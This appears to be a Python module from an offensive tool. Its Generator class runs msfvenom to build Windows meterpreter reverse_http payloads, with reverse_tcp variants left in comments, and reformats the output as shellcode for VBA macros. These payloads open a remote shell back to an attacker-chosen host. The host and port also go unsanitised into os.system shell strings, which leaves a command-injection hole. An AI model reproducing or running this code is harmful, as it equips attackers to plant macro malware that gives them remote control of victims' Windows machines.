from display import *

import os
import re
import base64

class Generator():


	def genShellcode(self, host, port, arch):
		#TODO fix to use string .format, remove the filewrite
		code = ''
		if (arch  == "x86"):
			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
			#os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
			#os.system("msfvenom --payload windows/exec CMD=\"calc\" -f csharp > /tmp/metasploit 2> /dev/null")
		else:
			os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f vba> /tmp/metasploit 2> /dev/null")
			#os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f vba > /tmp/metasploit 2> /dev/null")
			#os.system("msfvenom --payload windows/x64/exec CMD=\"calc\" -f csharp > /tmp/metasploit 2> /dev/null")

		with open("/tmp/metasploit", 'rb') as f:
			code = f.read()

#		print(str(code) + '\n\n')
		shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(code), flags=re.MULTILINE)
		shellcode = ''.join(i[0].replace('', '') for i in shellcode)
#		print(shellcode + '\n\n')

		k = shellcode.rfind(")\\r\\n\\n\\t")
		shellcode = shellcode[:k+5]

		even = 1
		lineEnd = " _\\r\\n"

		for i in range(0, len(shellcode)):
			if shellcode[i : i+len(lineEnd)] == lineEnd:
				if even == 2:
					shellcode = shellcode[:i]+shellcode[i+len(lineEnd):]
					even = even>>1
				else:
					shellcode = shellcode[:i]+" _\r\n"+shellcode[i+len(lineEnd):]
					even = even<<1
		shellcode = shellcode[:-4]	
			
#		shellcode = shellcode.replace(" _", '')
#		shellcode = shellcode.replace("\\r", '\r')
#		shellcode = shellcode.replace("\\n", '\n')
		
#		print(shellcode + '\n\n')
		#self.shellcode = str(base64.b64encode(code))
		#self.shellcode = str(code)
		#self.shellcode = self.shellcode.replace(self.shellcode[:2], '')
		#self.shellcode = self.shellcode[:-1]
		

		return shellcode
